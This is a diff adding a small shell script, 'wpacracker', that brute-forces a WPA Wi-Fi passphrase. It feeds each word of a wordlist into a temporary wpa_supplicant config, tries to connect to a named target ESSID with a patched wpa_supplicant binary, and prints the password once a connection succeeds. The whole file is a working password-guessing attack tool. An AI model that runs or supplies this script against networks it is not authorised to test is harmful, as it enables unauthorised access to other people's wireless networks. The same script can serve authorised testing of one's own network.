@@ -1,0 +1,44 @@
+#!/bin/sh
+usage() {
+cat << EOF
+wpacracker v0.0.1
+this programs goes through a wordlist and starts wpa_supplicant with a
+temporary config file. will display the correct password when found.
+this requires a patched wpa_supplicant binary.
+
+usage: cat wordlist | $0 wlanX ESSID
+where wlanX is your wifi interface, and ESSID is the target ESSID.
+EOF
+}
+make_config() {
+cat << EOF
+network={
+key_mgmt=WPA-PSK
+ssid="$1"
+psk="$2"
+}
+EOF
+}
+test -z "$2" && { usage ; exit 1 ; }
+test "$1" = --help && { usage ; exit 1 ; }
+ifconfig "$1" up || { echo "interface $1: error" ; exit 1 ; }
+itf="$1"
+essid="$2"
+tmp=/tmp/wpacrack.conf.$$
+export WPACRACK=1
+save_IFS="$IFS"
+export IFS='
+'
+while read line ; do
+IFS="$save_IFS"
+echo "TRYING: $line"
+make_config "$essid" "$line" > $tmp
+test $(printf "%s" "$line" | wc -c) -lt 8 && continue
+wpa_supplicant -Dnl80211,wext,hostapd,wired -i$itf -c$tmp &&  {
+	printf "SUCCESS: %s\n" "$line"
+	exit 0
+}
+export IFS='
+'
+done
+exit 1
